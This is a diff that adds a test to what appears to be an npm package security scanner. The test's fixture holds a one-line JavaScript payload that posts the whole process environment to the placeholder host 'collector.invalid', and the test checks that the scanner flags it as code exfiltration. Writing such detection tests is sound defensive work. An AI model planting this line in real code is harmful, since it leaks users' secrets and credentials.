@@ -82,3 +82,16 @@ def test_parse_spec():
     assert parse_spec("express@4.18.2") == ("express", "4.18.2")
     assert parse_spec("@babel/core") == ("@babel/core", None)
     assert parse_spec("@babel/core@7.24.0") == ("@babel/core", "7.24.0")
+
+
+def test_suspicious_code_changes_verdict(tmp_path):
+    tarball = make_tgz(
+        {
+            "package/package.json": manifest_json(),
+            "package/index.js": 'const h = require("https"); h.request({host: "collector.invalid"}).end(JSON.stringify(process.env));',
+        }
+    )
+    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW)
+    assert result.record.verdict == Verdict.SUSPICIOUS
+    assert any(f.rule_id == "code.exfiltration" for f in result.report.findings)
+    assert result.report.code_scan["filesScanned"] == 1
